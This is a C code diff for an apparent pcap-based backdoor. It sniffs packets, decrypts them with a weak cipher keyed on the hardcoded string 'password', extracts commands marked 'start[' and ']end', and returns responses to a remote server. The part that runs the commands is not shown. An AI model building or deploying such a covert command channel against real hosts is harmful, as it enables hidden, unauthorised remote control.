@@ -16,6 +16,7 @@
 #define LINESIZE 256
 #define COMMAND_START "start["
 #define COMMAND_END "]end"
+#define PASSWORD "password"
 
 // packet_handler callback function.
 void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {
@@ -48,9 +49,17 @@ void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u
   printf("Passed Header Key\n");
 
 	/* Step 3: decrypt the payload by a minus 5 character shift */
+  int p_index = 0;
 	for (loop = 0; loop < len; loop++) {
-    decrypt[loop] = ptr[loop] - 5;
+    //decrypt[loop] = ptr[loop] + 5;
+    int tmp = ptr[loop];
+    tmp = (tmp * -1) + PASSWORD[p_index];
+    decrypt[loop] = (char)tmp;
+    ++p_index;
+    if (p_index == (strlen(PASSWORD) - 1)) { p_index = 0; }
   }
+
+  printf("Decrypt Buffer: %s\n\n\n", decrypt);
 
 	/* Step 4: verify decrypted contents */
 	if (!(ptr = strstr(decrypt, COMMAND_START))) {
@@ -84,7 +93,7 @@ void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u
 
   // Send response.
   int server_len = sizeof(ss->server);
-  if (sendto(ss->sd, buff, MAXLEN, 0, (struct sockaddr *)&(ss->server), server_len) == -1) {
+  if (sendto(ss->sd, buff, strlen(buff), 0, (struct sockaddr *)&(ss->server), server_len) == -1) {
     perror("sendto failure");
     exit(1);
   }
